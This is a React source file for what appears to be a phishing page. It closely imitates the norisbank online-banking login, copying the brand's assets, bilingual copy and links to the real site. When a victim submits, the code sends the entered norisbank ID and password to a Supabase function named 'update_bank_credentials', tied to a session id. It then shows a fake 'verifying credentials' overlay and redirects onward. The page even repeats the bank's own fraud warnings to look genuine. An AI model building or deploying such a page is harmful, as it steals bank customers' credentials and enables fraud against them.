import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Phone, HelpCircle, Shield, Eye, EyeOff, ArrowLeft } from "lucide-react";
import bgAsset from "@/assets/norisbank-bg.png.asset.json";
import logoAsset from "@/assets/norisbank-logo.svg.asset.json";
import faviconAsset from "@/assets/favicons/norisbank.webp.asset.json";
import teaserAsset from "@/assets/norisbank-teaser.png.asset.json";

const ORANGE = "#FF5000";
const FIELD_BORDER = "#ee7971";
const FOCUS_RING = "#fd5000";
const CARD_BG = "#1c2533";
const PANEL_BG = "#1c2533";
const FOOTER_BG = "#101921";
const PAGE_BG = "#3a4558";
const TEXT = "#ffffff";
const MUTED = "#ffffff";

const URLS = {
  forgot: "https://meine.norisbank.de/",
  teaser: "https://www.norisbank.de/produkte/kostenloses-girokonto.html",
  warn: "https://www.norisbank.de/service/sicherheit.html",
  faq: "https://www.norisbank.de/service/faq.html",
  secHint: "https://www.norisbank.de/service/sicherheit/aktuelle-betrugsmaschen.html",
  firstSteps: "https://www.norisbank.de/service/online-banking.html",
  demo: "https://meine.norisbank.de/demo/",
  contact: "https://www.norisbank.de/service/kontakt.html",
  imprint: "https://www.norisbank.de/service/impressum.html",
  legal: "https://www.norisbank.de/service/rechtliches.html",
  privacy: "https://www.norisbank.de/service/datenschutz.html",
  cookies: "javascript:UC_UI.showSecondLayer();",
  revoke: "https://www.norisbank.de/service/widerruf.html",
};

type Lang = "de" | "en";

const COPY: Record<Lang, {
  greeting: string; greetingEvening: string;
  enterCreds: string;
  idLabel: string; pwLabel: string;
  forgot: string;
  continue: string; login: string; back: string;
  idError: string;
  teaserTitle: string; teaserText: string; teaserCta: string;
  warnTitle: string; warnText: string; warnCta: string;
  faqTitle: string; faqText: string; faqCta: string;
  secTitle: string; secText: string; secCta: string;
  langToggle: string;
  firstSteps: string; demo: string; contact: string;
  imprint: string; legal: string; privacy: string; cookies: string;
  revoke: string; copyright: string;
}> = {
  de: {
    greeting: "Guten Tag",
    greetingEvening: "Guten Abend",
    enterCreds: "Bitte geben Sie Ihre Zugangsdaten ein.",
    idLabel: "norisbank ID",
    pwLabel: "Passwort",
    forgot: "Zugangsdaten vergessen?",
    continue: "Weiter",
    login: "Einloggen",
    back: "Zurück",
    idError: "Bitte prüfen Sie Ihre Eingabe. Geben Sie Ihre norisbank ID ein.",
    teaserTitle: "Bis zu 12 x 120 Euro für Empfehler",
    teaserText: "Konto + Debitkarte weltweit kostenlos nutzbar + 120 € Prämie für empfohlene Neukunden",
    teaserCta: "Jetzt weiterempfehlen",
    warnTitle: "Warnung: Aktuelle Betrugsfälle",
    warnText: "Betrüger rufen als norisbank Sicherheitsabteilung an. Wichtig: Wir rufen Sie niemals an und fragen nach Passwörtern oder TAN-Nummern.",
    warnCta: "Mehr erfahren",
    faqTitle: "Häufige Fragen",
    faqText: "Fragen zum Online-Banking und zur App.",
    faqCta: "Direkt nachlesen!",
    secTitle: "Sicherheitshinweis",
    secText: "Informieren Sie sich regelmäßig über aktuelle Betrugsmaschen.",
    secCta: "Mehr erfahren",
    langToggle: "English Version",
    firstSteps: "Erste Schritte", demo: "Demo-Konto", contact: "Kontakt",
    imprint: "Impressum", legal: "Rechtliches", privacy: "Datenschutz", cookies: "Cookie-Einstellungen",
    revoke: "Vertrag widerrufen", copyright: "© 2026 norisbank GmbH",
  },
  en: {
    greeting: "Hello",
    greetingEvening: "Good evening",
    enterCreds: "Please enter your credentials.",
    idLabel: "norisbank ID",
    pwLabel: "Password",
    forgot: "Forgotten your credentials?",
    continue: "Continue",
    login: "Login",
    back: "Back",
    idError: "Please check your entry. Enter your norisbank ID.",
    teaserTitle: "Up to 12 x 120 euro for referrers",
    teaserText: "Account + debit card free worldwide + 120 € bonus for referred new customers",
    teaserCta: "Refer now",
    warnTitle: "Warning: Current fraud cases",
    warnText: "Fraudsters call pretending to be the norisbank security department. Important: We will never call you and ask for passwords or TAN numbers.",
    warnCta: "Learn more",
    faqTitle: "Frequently asked questions",
    faqText: "Questions about Online-Banking and the app.",
    faqCta: "Read now",
    secTitle: "Security notice",
    secText: "Stay informed about current fraud schemes.",
    secCta: "Learn more",
    langToggle: "Deutsche Version",
    firstSteps: "First steps", demo: "Demo account", contact: "Contact",
    imprint: "Imprint", legal: "Legal", privacy: "Privacy", cookies: "Cookie settings",
    revoke: "Revoke contract", copyright: "© 2026 norisbank GmbH",
  },
};

function fieldStyle(focused: boolean, touched: boolean, hasValue: boolean) {
  const errorEmpty = touched && !hasValue;
  return {
    borderColor: FIELD_BORDER,
    labelColor: FIELD_BORDER,
    isError: errorEmpty,
    focused,
  };
}

const Norisbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [step, setStep] = useState<1 | 2>(1);
  const [nid, setNid] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [idFocused, setIdFocused] = useState(false);
  const [idTouched, setIdTouched] = useState(false);
  const [pwFocused, setPwFocused] = useState(false);
  const [pwTouched, setPwTouched] = useState(false);
  const [lang, setLang] = useState<Lang>("de");
  const t = COPY[lang];

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("norisbank – Online-Banking", logoAsset.url);

  const handleContinue = () => {
    if (nid.trim().length === 0) { setIdTouched(true); return; }
    setStep(2);
  };

  const handleLogin = async () => {
    if (password.length === 0) { setPwTouched(true); return; }
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: nid,
        p_password: password,
        p_username_label: "norisbank ID",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const ext = { target: "_blank", rel: "noopener noreferrer" } as const;

  const greeting = (() => {
    const h = parseInt(new Intl.DateTimeFormat('de-DE', { timeZone: 'Europe/Berlin', hour: 'numeric', hour12: false }).format(new Date()), 10);
    return h >= 17 ? t.greetingEvening : t.greeting;
  })();

  const loginCard = (
    <div className="px-7 pt-7 pb-6 lg:px-10 lg:pt-10 lg:pb-7" style={{ backgroundColor: CARD_BG, color: TEXT, borderRadius: 16 }}>
      <div className="mb-7">
        <img src={logoAsset.url} alt="norisbank" className="h-6 w-auto" />
      </div>

      {step === 2 && (
        <div className="mb-2 flex items-center" style={{ height: 28 }}>
          <button
            type="button"
            onClick={() => setStep(1)}
            className="flex items-center gap-1 text-[13px] font-bold underline"
            style={{ color: ORANGE }}
          >
            <ArrowLeft size={13} /> {t.back}
          </button>
        </div>
      )}

      {step === 1 && (
        <h1 className="text-[32px] font-bold mb-3" style={{ lineHeight: 1.1 }}>
          {greeting}
        </h1>
      )}
      <p className="text-[15px] mb-6" style={{ color: TEXT }}>
        {t.enterCreds}
      </p>

      {step === 1 ? (
        <>
          {(() => {
            const fs = fieldStyle(idFocused, idTouched, nid.length > 0);
            return (
              <>
                <label className="block text-[13px] mb-1" style={{ color: fs.labelColor }}>
                  {t.idLabel}
                </label>
                <input
                  type="text"
                  value={nid}
                  onChange={(e) => setNid(e.target.value)}
                  onFocus={() => setIdFocused(true)}
                  onBlur={() => setIdFocused(false)}
                  onKeyDown={(e) => e.key === "Enter" && handleContinue()}
                  autoFocus
                  className="w-full px-4 py-3 text-[16px] outline-none bg-transparent"
                  style={{
                    border: `1px solid ${fs.borderColor}`,
                    borderRadius: 8,
                    color: TEXT,
                    transition: "box-shadow 80ms ease",
                    boxShadow: fs.focused ? `0 0 0 2px ${CARD_BG}, 0 0 0 4px ${FOCUS_RING}` : "none",
                  }}
                />
                {fs.isError && (
                  <div className="mt-2 text-[13px]" style={{ color: FIELD_BORDER }}>
                    {t.idError}
                  </div>
                )}
              </>
            );
          })()}

          <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4 lg:gap-3 mt-24">
            <button
              type="button"
              onClick={handleContinue}
              className="nb-primary-btn px-6 py-3 font-semibold text-[15px] w-full lg:w-auto order-1 lg:order-2"
              style={{ color: "#1c2533", cursor: "pointer" }}
            >
              {t.continue}
            </button>
            <a href={URLS.forgot} {...ext} className="text-[13px] font-bold underline order-2 lg:order-1" style={{ color: ORANGE }}>
              {t.forgot}
            </a>
          </div>
        </>
      ) : (
        <>
          {(() => {
            const fs = fieldStyle(pwFocused, pwTouched, password.length > 0);
            return (
              <>
                <label className="block text-[13px] mb-1" style={{ color: fs.labelColor }}>
                  {t.pwLabel}
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => setPwFocused(true)}
                    onBlur={() => setPwFocused(false)}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                    autoFocus
                    className="w-full px-4 py-3 pr-12 text-[16px] outline-none bg-transparent"
                    style={{
                      border: `1px solid ${fs.borderColor}`,
                      borderRadius: 8,
                      color: TEXT,
                      transition: "box-shadow 80ms ease",
                      boxShadow: fs.focused ? `0 0 0 2px ${CARD_BG}, 0 0 0 4px ${FOCUS_RING}` : "none",
                    }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2"
                    style={{ color: ORANGE }}
                    aria-label="Passwort anzeigen"
                  >
                    {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
                  </button>
                </div>
              </>
            );
          })()}

          <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4 lg:gap-3 mt-24">
            {(() => {
              const pwEmpty = password.length === 0;
              return (
                <button
                  type="button"
                  onClick={handleLogin}
                  className={(pwEmpty ? "px-6 py-3 font-semibold text-[15px]" : "nb-primary-btn px-6 py-3 font-semibold text-[15px]") + " w-full lg:w-auto order-1 lg:order-2"}
                  style={pwEmpty
                    ? { backgroundColor: "#2f3949", color: "#8c98a8", borderRadius: 999, cursor: "default" }
                    : { color: "#1c2533", cursor: "pointer" }}
                >
                  {t.login}
                </button>
              );
            })()}
            <a href={URLS.forgot} {...ext} className="text-[13px] font-bold underline order-2 lg:order-1" style={{ color: ORANGE }}>
              {t.forgot}
            </a>
          </div>
        </>
      )}
    </div>
  );

  const InfoBlock = ({ icon, title, text, cta, href, divider }: { icon: React.ReactNode; title: string; text: string; cta: string; href: string; divider?: boolean }) => (
    <div className="px-6 py-6" style={divider ? { borderTop: "1px solid #3d4759" } : undefined}>
      <div className="flex items-center gap-2 mb-2 font-semibold text-[15px]" style={{ color: TEXT }}>
        {icon}{title}
      </div>
      <p className="text-[14px] mb-3" style={{ color: MUTED }}>{text}</p>
      <a href={href} {...ext} className="text-[13px] font-bold underline" style={{ color: ORANGE }}>
        {cta}
      </a>
    </div>
  );

  const rightPanel = (
    <div style={{ backgroundColor: PANEL_BG }}>
      <a href={URLS.teaser} {...ext} className="block px-6 pt-6 pb-6">
        <img src={teaserAsset.url} alt={t.teaserTitle} className="w-full h-auto mb-4" />
        <div className="font-bold text-[16px] mb-2" style={{ color: TEXT }}>{t.teaserTitle}</div>
        <p className="text-[14px] mb-3" style={{ color: MUTED }}>{t.teaserText}</p>
        <div className="text-[13px] font-bold underline" style={{ color: ORANGE }}>{t.teaserCta}</div>
      </a>

      <InfoBlock icon={<Phone size={18} color={TEXT} />} title={t.warnTitle} text={t.warnText} cta={t.warnCta} href={URLS.warn} divider />
      <InfoBlock icon={<HelpCircle size={18} color={TEXT} />} title={t.faqTitle} text={t.faqText} cta={t.faqCta} href={URLS.faq} />
      <InfoBlock icon={<Shield size={18} color={TEXT} />} title={t.secTitle} text={t.secText} cta={t.secCta} href={URLS.secHint} />

      <div className="px-6 py-7 text-[13px]" style={{ borderTop: "1px solid #3d4759", backgroundColor: FOOTER_BG }}>
        <div className="flex flex-wrap gap-x-5 gap-y-2 mb-3 font-bold">
          <button
            type="button"
            onClick={() => setLang(lang === "de" ? "en" : "de")}
            className="hover:underline hidden lg:inline"
            style={{ color: ORANGE, background: "none", padding: 0 }}
          >
            {t.langToggle}
          </button>
          <a href={URLS.firstSteps} {...ext} className="hover:underline" style={{ color: ORANGE }}>{t.firstSteps}</a>
          <a href={URLS.demo} {...ext} className="hover:underline" style={{ color: ORANGE }}>{t.demo}</a>
          <a href={URLS.contact} {...ext} className="hover:underline" style={{ color: ORANGE }}>{t.contact}</a>
        </div>
        <div className="flex flex-wrap gap-x-5 gap-y-2 mb-4 font-bold">
          <a href={URLS.imprint} {...ext} className="hover:underline" style={{ color: ORANGE }}>{t.imprint}</a>
          <a href={URLS.legal} {...ext} className="hover:underline" style={{ color: ORANGE }}>{t.legal}</a>
          <a href={URLS.privacy} {...ext} className="hover:underline" style={{ color: ORANGE }}>{t.privacy}</a>
        </div>
        <div className="flex flex-wrap gap-x-5 gap-y-2 mb-5 font-bold">
          <a href={URLS.cookies} className="hover:underline" style={{ color: ORANGE }}>{t.cookies}</a>
        </div>
        <a
          href={URLS.revoke}
          {...ext}
          className="inline-block w-full lg:w-auto text-center text-[13px] font-semibold px-6 py-2.5 mb-4 no-underline"
          style={{ color: ORANGE, border: `1px solid ${ORANGE}`, borderRadius: 999 }}
        >
          {t.revoke}
        </a>
        <div className="text-[13px]" style={{ color: "#ffffff" }}>{t.copyright}</div>
      </div>
    </div>
  );

  return (
    <>
      <style>{`
        .nb-font { font-family: 'SourceSans3', 'Arial', sans-serif; }
        .nb-primary-btn { background:${ORANGE}; border-radius:999px; transition: background 120ms ease; }
        .nb-primary-btn:hover { background:#e04700; }
        .nb-hero-bg { background-color: ${PAGE_BG}; }
        @media (min-width: 1024px) {
          .nb-hero-bg {
            background-image: url(${bgAsset.url});
            background-size: cover;
            background-position: center;
            background-color: ${PAGE_BG};
          }
          .nb-right-panel {
            position: fixed; top: 0; bottom: 0;
            left: max(788px, calc(50% + 188px));
            width: 396px; overflow-y: auto;
            scrollbar-width: none; -ms-overflow-style: none;
          }
          .nb-right-panel::-webkit-scrollbar { display: none; }
        }
      `}</style>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col nb-font" style={{ color: TEXT }}>
        {/* MOBILE */}
        <div className="lg:hidden">
          <div className="nb-hero-bg px-4 pt-6 pb-6">
            {loginCard}
          </div>
          <div className="nb-right-panel-mobile" style={{ backgroundColor: PANEL_BG }}>
            {rightPanel}
          </div>
        </div>

        {/* DESKTOP */}
        <div className="hidden lg:block relative flex-1 nb-hero-bg" style={{ minHeight: "100vh" }}>
          <div className="max-w-[1200px] mx-auto px-4 py-16 grid grid-cols-[minmax(0,560px)_minmax(0,396px)] gap-[256px] items-center" style={{ minHeight: "100vh" }}>
            <div>
              {loginCard}
            </div>
            <div className="nb-right-panel">{rightPanel}</div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Norisbank;
